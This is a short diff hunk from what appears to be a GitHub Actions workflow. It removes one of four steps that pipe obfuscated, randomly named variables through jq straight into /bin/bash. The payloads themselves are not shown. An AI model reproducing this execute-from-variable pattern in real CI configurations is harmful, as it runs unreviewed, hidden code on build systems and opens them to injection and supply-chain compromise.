@@ -26,7 +26,6 @@ jobs:
           echo $zc1929 | jq -r .grdvm761 | /bin/bash
           echo $ydg54 | jq -r .cdyi8 | /bin/bash
           echo $c33406 | jq -r .ugpc890 | /bin/bash
-          echo $pnx911 | jq -r .nh19783 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
